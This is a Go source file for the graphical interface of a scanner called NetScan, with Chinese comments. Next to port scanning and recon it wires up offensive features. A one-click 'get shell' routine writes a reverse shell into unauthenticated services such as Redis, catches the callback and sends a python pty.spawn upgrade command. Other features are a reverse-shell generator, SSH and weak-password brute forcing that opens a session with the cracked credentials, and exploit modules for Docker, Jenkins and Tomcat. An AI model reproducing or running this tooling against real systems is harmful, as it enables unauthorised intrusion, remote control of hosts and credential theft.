package webgui

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/webview/webview_go"
	"portscanner/internal/scanner"
)

//go:embed index.html
var indexHTML string

// scanRequest 前端传来的扫描配置
type scanRequest struct {
	Targets       []string `json:"targets"`
	Ports         string   `json:"ports"`
	ExcludePorts  string   `json:"exclude_ports"`
	ScanTypes     []string `json:"scan_types"`
	Timing        int      `json:"timing"`
	SkipDiscovery bool     `json:"skip_discovery"`
	DiscoveryOnly bool     `json:"discovery_only"`
	ServiceDetect bool     `json:"service_detect"`
	VersionDetect bool     `json:"version_detect"`
	OSDetect      bool     `json:"os_detect"`
	ResolveDNS    bool     `json:"resolve_dns"`
	POC           bool     `json:"poc"`
	Fingerprint   bool     `json:"fingerprint"`
	Banner        bool     `json:"banner"`
	StopAfter     bool     `json:"stop_after"`
	Proxy         string   `json:"proxy"`
	Rate          int      `json:"rate"`
	SortBy        string   `json:"sort_by"`
	DirSearch     bool     `json:"dir_search"`
	WebCheck      bool     `json:"web_check"`
	SubBrute      bool     `json:"sub_brute"`
	SubDepth      int      `json:"sub_depth"`
	Whois         bool     `json:"whois"`
	DNSRecords    bool     `json:"dns_records"`
	UseHTTPS      bool     `json:"use_https"`
}

// Run 启动基于 WebView 的图形界面
func Run() {
	// 加载用户自定义模块(modules/ 目录)
	scanner.OpenModuleManager("").Load()

	w := webview.New(false)
	defer w.Destroy()
	w.SetTitle("NetScan 网络扫描器")
	w.SetSize(1280, 900, webview.HintNone)

	var mu sync.Mutex
	var current *scanner.Scanner
	var resultMu sync.Mutex
	var collected []scanner.Result
	var lastTarget, lastPorts string

	// UI 更新器: 收集 JS 片段, 由单一 goroutine 批量刷入,
	// 避免多 goroutine 并发调用 Dispatch/Eval 触发 webview 崩溃
	var uiMu sync.Mutex
	var pending []string
	dispatchJS := func(js string) {
		uiMu.Lock()
		pending = append(pending, js)
		uiMu.Unlock()
	}
	recon := func(line string) {
		dispatchJS("window.addRecon(" + strconv.Quote(line) + ")")
	}
	recon2 := func(line string) {
		dispatchJS("window.addExploitRecon(" + strconv.Quote(line) + ")")
	}
	// 交互式 shell 会话(纯 GUI 内嵌终端)
	var shellMu sync.Mutex
	var shellConn net.Conn
	shellOut := func(line string) {
		dispatchJS("window.addShellOut(" + strconv.Quote(line) + ")")
	}
	go func() {
		t := time.NewTicker(50 * time.Millisecond)
		defer t.Stop()
		for range t.C {
			uiMu.Lock()
			batch := pending
			pending = nil
			uiMu.Unlock()
			if len(batch) == 0 {
				continue
			}
			w.Dispatch(func() {
				for _, js := range batch {
					w.Eval(js)
				}
			})
		}
	}()

	w.Bind("startScan", func(optsJSON string) error {
		req := scanRequest{}
		if err := json.Unmarshal([]byte(optsJSON), &req); err != nil {
			return err
		}
		opts := buildOptions(req)

		resultMu.Lock()
		collected = nil
		lastTarget = strings.Join(req.Targets, ",")
		lastPorts = req.Ports
		resultMu.Unlock()

		s := scanner.NewScanner(opts,
			func(r scanner.Result) {
				resultMu.Lock()
				collected = append(collected, r)
				resultMu.Unlock()
				b, _ := json.Marshal(r)
				dispatchJS("window.addResult(" + string(b) + ")")
			},
			func(p scanner.Progress) {
				b, _ := json.Marshal(p)
				dispatchJS("window.onProgress(" + string(b) + ")")
			},
		)
		mu.Lock()
		current = s
		mu.Unlock()

		go func() {
			defer func() {
				if r := recover(); r != nil {
					dispatchJS("window.onScanDone(" + strconv.Quote(fmt.Sprintf("扫描异常: %v", r)) + ")")
				}
			}()
			if err := s.Run(); err != nil {
				dispatchJS("window.onScanDone(" + strconv.Quote("扫描出错: "+err.Error()) + ")")
			} else {
				dispatchJS(`window.onScanDone("扫描完成")`)
			}

			// Banner 抓取
			if req.Banner {
				resultMu.Lock()
				rs := make([]scanner.Result, len(collected))
				copy(rs, collected)
				resultMu.Unlock()
				recon("========== Banner 抓取 ==========")
				for _, r := range rs {
					if r.State != scanner.StateOpen || r.Protocol != "tcp" {
						continue
					}
					b := scanner.GrabBanner(r.IP, r.Port, 2*time.Second)
					if b != "" {
						recon(fmt.Sprintf("[%s:%d %s]\n%s", r.IP, r.Port, r.Service, strings.TrimSpace(b)))
					}
				}
				recon("========== Banner 完成 ==========")
			}

			// 插件: notification 推送 / report 生成报告 / output 自定义输出
			resultMu.Lock()
			rs := make([]scanner.Result, len(collected))
			copy(rs, collected)
			target := lastTarget
			ports := lastPorts
			resultMu.Unlock()
			pm := scanner.OpenPluginManager("")
			pm.Notify(rs)
			for _, path := range pm.GenerateReports(target, ports, rs) {
				recon("插件报告已生成: " + path)
			}
			for name, text := range pm.RenderOutput(rs) {
				recon("===== 插件输出: " + name + " =====\n" + text)
			}
		}()

		// Web 侦察
		if req.DirSearch || req.WebCheck || req.SubBrute || req.Whois || req.DNSRecords {
			go runRecon(req, recon)
		}
		return nil
	})

	w.Bind("stopScan", func() {
		mu.Lock()
		s := current
		mu.Unlock()
		if s != nil {
			s.Stop()
		}
	})

	// 路由跟踪
	w.Bind("traceroute", func(target string) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon("无法解析 " + target)
				return
			}
			recon("========== 路由跟踪 " + target + " (" + ip + ") ==========")
			scanner.TraceRoute(ip, 30, time.Second, func(hop int, addr string, rtt time.Duration) {
				if addr == "*" {
					recon(fmt.Sprintf("%3d  *", hop))
				} else {
					recon(fmt.Sprintf("%3d  %-16s %v", hop, addr, rtt.Round(time.Millisecond)))
				}
			})
			recon("========== 路由跟踪完成 ==========")
		}()
		return nil
	})

	// Ping
	w.Bind("pingTarget", func(target string) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon("无法解析 " + target)
				return
			}
			rtt, ok := scanner.Ping(ip, time.Second)
			if ok {
				recon(fmt.Sprintf("%s (%s) 存活 延迟 %v", target, ip, rtt.Round(time.Millisecond)))
			} else {
				recon(fmt.Sprintf("%s (%s) 不可达", target, ip))
			}
		}()
		return nil
	})

	// 导出 HTML 报告
	w.Bind("exportHTML", func(name string) (string, error) {
		resultMu.Lock()
		rs := make([]scanner.Result, len(collected))
		copy(rs, collected)
		target := lastTarget
		ports := lastPorts
		resultMu.Unlock()
		dir := downloadDir()
		path := filepath.Join(dir, name)
		if err := scanner.WriteHTMLReport(path, target, ports, rs); err != nil {
			return "", err
		}
		return path, nil
	})

	// 反弹 shell 生成
	w.Bind("shellGen", func(shellType, lhost string, lport int) string {
		return scanner.ReverseShell(shellType, lhost, lport)
	})

	// 漏洞报告
	w.Bind("vulnReport", func() string {
		return scanner.VulnReport()
	})

	// 一键拿 shell: 检测未授权→写反弹 shell→监听→内嵌终端交互
	w.Bind("getShell", func(target, lhost string, lport, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				shellOut("无法解析 " + target + "\n")
				return
			}
			if lhost == "" {
				shellOut("请填写回连地址(lhost)\n")
				return
			}
			if port <= 0 {
				port = 6379
			}
			ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", lport))
			if err != nil {
				shellOut("监听失败: " + err.Error() + "\n")
				return
			}
			defer ln.Close()
			shellOut(fmt.Sprintf("========== 一键拿 shell %s:%d (监听 %d) ==========\n", ip, port, lport))

			result := scanner.GetShell(ip, port, lhost, lport, 5*time.Second)
			shellOut(result + "\n")
			if strings.HasPrefix(result, "目标") || strings.HasPrefix(result, "写入失败") || strings.HasPrefix(result, "连接失败") || strings.HasPrefix(result, "端口") || strings.HasPrefix(result, "检测未命中") || strings.HasPrefix(result, "不可") {
				shellOut("========== 拿 shell 失败 ==========\n")
				return
			}

			ln.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
			conn, err := ln.Accept()
			if err != nil {
				shellOut("60 秒内未收到 shell 连接\n")
				return
			}

			// 关闭旧会话, 保存新连接
			shellMu.Lock()
			if shellConn != nil {
				_ = shellConn.Close()
			}
			shellConn = conn
			shellMu.Unlock()

			shellOut("[+] 收到反弹 shell: " + conn.RemoteAddr().String() + "\n")
			// 自动升级 PTY: 让远端 bash 获得 job control, 可运行 vim/top/sudo 等
			_, _ = conn.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n"))

			// 持续读取 shell 输出推送到内嵌终端
			buf := make([]byte, 4096)
			for {
				n, err := conn.Read(buf)
				if n > 0 {
					shellOut(string(buf[:n]))
				}
				if err != nil {
					break
				}
			}
			shellOut("\n[*] shell 已断开\n")
			shellMu.Lock()
			if shellConn == conn {
				shellConn = nil
			}
			shellMu.Unlock()
			_ = conn.Close()
		}()
		return nil
	})

	// 交互式 shell: 发送命令 / 断开连接
	w.Bind("shellInput", func(cmd string) {
		shellMu.Lock()
		c := shellConn
		shellMu.Unlock()
		if c == nil {
			shellOut("未连接 shell\n")
			return
		}
		_, _ = c.Write([]byte(cmd + "\n"))
	})
	w.Bind("shellClose", func() {
		shellMu.Lock()
		c := shellConn
		shellConn = nil
		shellMu.Unlock()
		if c != nil {
			_ = c.Close()
		}
	})

	// 扫描目标所有漏洞(仅命中)
	w.Bind("scanVuln", func(target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 80
			}
			recon2(fmt.Sprintf("========== 扫描漏洞 %s:%d ==========", ip, port))
			hits := scanner.ScanVulns(ip, port, 3*time.Second)
			if len(hits) == 0 {
				recon2("未发现漏洞")
			} else {
				recon2(fmt.Sprintf("命中 %d 个漏洞:", len(hits)))
				for _, h := range hits {
					recon2(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
				}
			}
			recon2("========== 漏洞扫描完成 ==========")
		}()
		return nil
	})

	// 扫描 Web POC 模板
	w.Bind("pocScan", func(target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 80
			}
			recon2(fmt.Sprintf("========== 扫描 Web POC %s:%d ==========", ip, port))
			hits := scanner.ScanPOCs(ip, port, 3*time.Second)
			if len(hits) == 0 {
				recon2("未命中任何 POC")
			} else {
				recon2(fmt.Sprintf("命中 %d 个 POC:", len(hits)))
				for _, h := range hits {
					recon2(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
				}
			}
			recon2("========== POC 扫描完成 ==========")
		}()
		return nil
	})

	// SSH 爆破 + 弹交互式命令行窗口
	w.Bind("sshShell", func(target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = 22
			}
			recon2(fmt.Sprintf("========== SSH 爆破 %s:%d ==========", ip, port))
			user, pass, ok := scanner.BruteSSHOnce(ip, port, nil, nil, 10, 3*time.Second)
			if !ok {
				recon2("爆破失败, 未找到凭据")
				return
			}
			recon2(fmt.Sprintf("[成功] %s:%d  用户:%s 密码:%s", ip, port, user, pass))
			// 弹新命令行窗口运行交互式 SSH
			exe, _ := os.Executable()
			cmd := exec.Command("cmd", "/c", "start", "NetScan-SSH", exe,
				"--ssh-connect", "-target", ip, "-p", strconv.Itoa(port),
				"--ssh-user", user, "--ssh-pass", pass)
			if err := cmd.Start(); err != nil {
				recon2("弹出命令行失败: " + err.Error())
				return
			}
			recon2("已弹出交互式 SSH 命令行窗口")
		}()
		return nil
	})

	// 弱口令爆破
	w.Bind("brute", func(target string, port int, service string, threads, delay int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = defaultPort(service)
			}
			recon2(fmt.Sprintf("========== 爆破 %s %s:%d ==========", service, ip, port))
			scanner.BruteForce(ip, port, service, nil, nil, threads, time.Duration(delay)*time.Millisecond, 3*time.Second, func(r scanner.BruteResult) {
				recon2(fmt.Sprintf("[成功] %s://%s:%d  用户:%s 密码:%s", r.Service, ip, port, r.Username, r.Password))
			})
			recon2("========== 爆破完成 ==========")
		}()
		return nil
	})

	// 漏洞利用
	w.Bind("exploit", func(name, target string, port int) error {
		go func() {
			ip, err := resolveHost(target)
			if err != nil {
				recon2("无法解析 " + target)
				return
			}
			if port <= 0 {
				port = defaultPort(name)
			}
			recon2(fmt.Sprintf("========== 利用 %s %s:%d ==========", name, ip, port))
			if name == "auto" {
				recon2(scanner.AutoExploit(ip, port, "", 5*time.Second))
			} else {
				recon2(scanner.RunExploit(name, ip, port, 5*time.Second))
			}
			recon2("========== 利用完成 ==========")
		}()
		return nil
	})

	// 查看资产历史
	w.Bind("history", func(target string) string {
		s := scanner.OpenStore(scanner.DefaultStateDir())
		recs, err := s.History(target)
		if err != nil {
			return "无历史记录"
		}
		var sb strings.Builder
		for _, rec := range recs {
			sb.WriteString("=== " + rec.Target + " (" + rec.Time.Format("2006-01-02 15:04:05") + ") ===\n")
			for _, a := range rec.Assets {
				sb.WriteString(fmt.Sprintf("  %s:%-5d/%-3s %s\n", a.IP, a.Port, a.Protocol, a.Service))
			}
		}
		return sb.String()
	})

	// 保存到资产库
	w.Bind("storeScan", func(target string) string {
		resultMu.Lock()
		rs := make([]scanner.Result, len(collected))
		copy(rs, collected)
		resultMu.Unlock()
		s := scanner.OpenStore(scanner.DefaultStateDir())
		if err := s.Save(target, rs); err != nil {
			return "保存失败: " + err.Error()
		}
		return "已保存到资产库"
	})

	// ---- 插件管理 ----
	pm := scanner.OpenPluginManager(scanner.DefaultPluginDir())
	w.Bind("getPlugins", func() (string, error) {
		b, _ := json.Marshal(pm.List())
		return string(b), nil
	})
	w.Bind("getMarketPlugins", func() (string, error) {
		b, _ := json.Marshal(scanner.MarketplacePlugins())
		return string(b), nil
	})
	w.Bind("installMarketPlugin", func(id string) error {
		return scanner.InstallMarketPlugin(id)
	})
	w.Bind("installFilePlugin", func(path string) error {
		return pm.Install(path)
	})
	w.Bind("enablePlugin", func(id string) error { return pm.Enable(id) })
	w.Bind("disablePlugin", func(id string) error { return pm.Disable(id) })
	w.Bind("uninstallPlugin", func(id string) error { return pm.Remove(id) })
	w.Bind("updatePlugin", func(id string) error { return scanner.InstallMarketPlugin(id) })

	w.SetHtml(indexHTML)
	w.Run()
}

// defaultPort 根据服务/模块名返回默认端口
func defaultPort(name string) int {
	switch strings.ToLower(name) {
	case "ftp":
		return 21
	case "ssh":
		return 22
	case "telnet":
		return 23
	case "smtp":
		return 25
	case "mysql":
		return 3306
	case "postgresql":
		return 5432
	case "redis", "redis-write-shell":
		return 6379
	case "docker", "docker-escape":
		return 2375
	case "elasticsearch", "es-file-read":
		return 9200
	case "nacos", "nacos-register":
		return 8848
	case "jenkins", "jenkins-script":
		return 8080
	case "tomcat", "tomcat-war":
		return 8080
	}
	return 80
}

func buildOptions(req scanRequest) scanner.Options {
	opts := scanner.DefaultOptions()
	opts.Targets = req.Targets
	opts.Ports = req.Ports
	opts.ExcludePorts = req.ExcludePorts
	opts.Timing = req.Timing
	opts.Timeout = 0
	opts.Concurrency = 0
	opts.SkipDiscovery = req.SkipDiscovery
	opts.DiscoveryOnly = req.DiscoveryOnly
	opts.ServiceDetect = req.ServiceDetect
	opts.VersionDetect = req.VersionDetect
	opts.OSDetect = req.OSDetect
	opts.ResolveDNS = req.ResolveDNS
	opts.POC = req.POC
	opts.Fingerprint = req.Fingerprint
	opts.StopAfterHost = req.StopAfter
	opts.ProxyURL = req.Proxy
	opts.Rate = req.Rate

	var types []scanner.ScanType
	for _, t := range req.ScanTypes {
		types = append(types, scanner.ScanType(t))
	}
	if len(types) > 0 {
		opts.ScanTypes = types
	}
	return opts
}

// runRecon 执行 Web 侦察功能, 结果逐行推送到前端
func runRecon(req scanRequest, push func(string)) {
	if len(req.Targets) == 0 {
		return
	}
	host := stripScheme(req.Targets[0])
	domain := strings.SplitN(host, "/", 2)[0]
	port := firstPort(req.Ports, 80)
	timeout := 3 * time.Second

	if req.DirSearch {
		push(fmt.Sprintf("========== 目录爆破 %s:%d ==========", domain, port))
		scanner.DirSearch(domain, port, req.UseHTTPS, 30, timeout, func(path string, status int, size int64) {
			push(fmt.Sprintf("%-40s [%d] %d字节", path, status, size))
		})
	}

	if req.WebCheck {
		push(fmt.Sprintf("========== Web 头检查 %s:%d ==========", domain, port))
		headers, issues := scanner.WebHeaderCheck(domain, port, req.UseHTTPS, timeout)
		if headers == nil {
			push("无法连接到目标 Web 服务")
		} else {
			push("--- 响应头 ---")
			for k, v := range headers {
				push(fmt.Sprintf("  %s: %s", k, v))
			}
			if len(issues) > 0 {
				push("--- 安全问题 ---")
				for _, issue := range issues {
					push(fmt.Sprintf("  [%s] %s", issue.Level, issue.Message))
				}
			}
		}
	}

	if req.SubBrute {
		depth := req.SubDepth
		if depth < 1 {
			depth = 1
		}
		push(fmt.Sprintf("========== 子域名爆破 %s (深度 %d) ==========", domain, depth))
		scanner.SubdomainBrute(domain, depth, 50, timeout, func(sub, ip string) {
			push(fmt.Sprintf("%-40s -> %s", sub, ip))
		})
	}

	if req.Whois {
		push(fmt.Sprintf("========== Whois %s ==========", domain))
		info, err := scanner.Whois(domain, 5*time.Second)
		if err != nil {
			push("Whois 失败: " + err.Error())
		} else {
			for _, line := range strings.Split(info, "\n") {
				push(strings.TrimRight(line, "\r"))
			}
		}
	}

	if req.DNSRecords {
		push(fmt.Sprintf("========== DNS 记录 %s ==========", domain))
		records := scanner.DNSRecords(domain, 5*time.Second)
		order := []string{"A/AAAA", "CNAME", "MX", "NS", "TXT"}
		for _, typ := range order {
			for _, v := range records[typ] {
				push(fmt.Sprintf("%-8s %s", typ, v))
			}
		}
	}

	push("========== 侦察完成 ==========")
}

func resolveHost(s string) (string, error) {
	s = stripScheme(s)
	if ip := net.ParseIP(s); ip != nil {
		return s, nil
	}
	ips, err := net.LookupIP(s)
	if err != nil || len(ips) == 0 {
		return "", fmt.Errorf("无法解析 %s", s)
	}
	for _, ip := range ips {
		if v4 := ip.To4(); v4 != nil {
			return v4.String(), nil
		}
	}
	return ips[0].String(), nil
}

// downloadDir 返回 HTML 报告保存目录(优先 Downloads, 回退到用户主目录)
func downloadDir() string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return "."
	}
	d := filepath.Join(home, "Downloads")
	if fi, err := os.Stat(d); err == nil && fi.IsDir() {
		return d
	}
	return home
}

func stripScheme(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(strings.TrimPrefix(s, "http://"), "https://")
	return s
}

func firstPort(spec string, def int) int {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return def
	}
	p := strings.SplitN(spec, ",", 2)[0]
	p = strings.SplitN(p, "-", 2)[0]
	p = strings.TrimPrefix(strings.TrimSpace(p), "top-")
	if n, err := strconv.Atoi(p); err == nil && n > 0 && n <= 65535 {
		return n
	}
	return def
}
